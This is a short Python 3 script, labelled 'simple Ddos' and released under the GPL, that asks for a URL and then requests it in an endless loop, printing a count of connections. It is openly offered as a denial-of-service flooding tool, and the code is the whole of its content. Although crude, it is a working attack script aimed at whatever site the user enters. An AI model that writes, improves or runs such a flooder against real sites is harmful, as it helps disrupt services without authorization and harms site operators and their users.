#!/usr/bin/python3.2
# simple Ddos in Python 3.2.py
#
# Copyright 2012 Ashutosh Das (pri$m) <>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
import urllib.request
print(""" _ __ _ __(_)___ _ __ ___
| '_ \| '__| / __| '_ ` _ \
| |_) | | | \__ \ | | | | |
| .__/|_| |_|___/_| |_| |_|
|_|
""")

try:
    n = 0
    a = input("Enter URL with Protocal : ") #Example : http://example.com

    while True :

            try :
                raw = urllib.request.urlopen(a)
            

            except ValueError:
                print("Invalid URL")
                break

            n = n+ 1

            print("{} times connected".format(n))

except KeyboardInterrupt:
    print("Bye!")
